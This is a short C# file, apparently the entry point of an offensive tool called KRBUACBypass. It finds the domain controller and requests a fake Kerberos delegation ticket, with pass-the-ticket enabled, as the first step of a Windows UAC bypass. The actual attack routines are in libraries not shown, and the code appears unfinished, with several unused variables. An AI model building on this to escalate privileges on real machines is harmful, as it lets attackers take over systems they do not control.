using System;
using KRBUACBypass.lib.Interop;

namespace KRBUACBypass
{
    internal class Program
    {
        public static bool wrapTickets = false;
        public static bool Debug = false;
        public static bool Verbose = true;
        public static bool BogusMachineID = true;

        static void Main(string[] args)
        {
            Run();
        }

        private static void Run()
        {
            string domainController = Networking.GetDCName();
            string service = $"HOST/{Dns.GetHostName()}";
            Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial;
            string outfile = "";
            bool ptt = true;

            byte[] blah = LSA.RequestFakeDelegTicket();
        }
    }
}
